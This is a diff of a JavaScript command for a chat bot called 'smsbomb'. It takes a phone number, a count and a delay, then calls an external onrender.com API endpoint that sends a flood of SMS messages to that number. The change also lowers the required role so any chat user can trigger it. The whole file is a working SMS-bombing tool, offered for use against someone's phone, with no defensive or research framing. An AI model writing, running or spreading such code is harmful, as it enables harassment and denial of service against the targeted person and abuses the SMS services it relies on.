@@ -1,54 +1,35 @@
 const axios = require('axios');
 
 module.exports.config = {
-	name: "smsbomb",
-	version: "1.0.0",
-	credits: "taichi/jenard",
-	hasPrefix: true,
-	role: 2,
-	description: "sms spammer",
-	aliases: [],
-	usage: "[number] [amount] [delay]",
-	cooldown: 5,
+    name: 'smsbomb',
+    version: '1.0.0',
+    role: 0,
+    hasPrefix: true,
+    aliases: ['smsbomb'],
+    description: "Start SMS bombing",
+    usage: "smsbomb [phone] [amount] [cooldown]",
+    credits: 'churchill',
 };
 
-module.exports.run = async function ({ event, args, api }) {
-	const number = args[0];
-	const amount = parseInt(args[1], 10);
-	const delay = parseInt(args[2], 10);
+module.exports.run = async function ({ api, event, args }) {
+    const [phone, amount, cooldown] = args;
 
-	if (!number || isNaN(amount) || isNaN(delay)) {
-		return api.sendMessage("Please provide a valid number, amount, and delay.", event.threadID);
-	}
+    if (!phone || !amount || !cooldown) {
+        return api.sendMessage('Please provide a phone number, amount, and cooldown period.', event.threadID, event.messageID);
+    }
 
-	try {
-		api.sendMessage("Processing your request...", event.threadID);
+    try {
+        const response = await axios.get(`https://deku-rest-api-ywad.onrender.com/smsb`, {
+            params: {
+                number: phone,
+                amount: amount,
+                delay: cooldown
+            }
+        });
 
-		let successCount = 0;
-		for (let i = 0; i < amount; i++) {
-			try {
-				const response = await axios.get('https://deku-rest-api-ywad.onrender.com/smsb', {
-					params: {
-						number: encodeURIComponent(number),
-						delay: encodeURIComponent(delay),
-					}
-				});
-
-				if (response.data && response.data.success) {
-					successCount++;
-					api.sendMessage(`${successCount} success sent`, event.threadID);
-				} else {
-					api.sendMessage(`Failed to send SMS ${i + 1}`, event.threadID);
-				}
-			} catch (error) {
-				console.error(`Error sending SMS ${i + 1}:`, error.message);
-				api.sendMessage(`An error occurred while sending SMS ${i + 1}`, event.threadID);
-			}
-			await new Promise(resolve => setTimeout(resolve, delay));
-		}
-		api.sendMessage("All requests processed.", event.threadID);
-	} catch (error) {
-		console.error("Error processing request:", error.message);
-		api.sendMessage("An error occurred while processing the request.", event.threadID);
-	}
+        api.sendMessage('SMS bombing started!', event.threadID, event.messageID);
+    } catch (error) {
+        console.error('Error starting SMS bombing:', error);
+        api.sendMessage('Error starting SMS bombing.', event.threadID, event.messageID);
+    }
 };
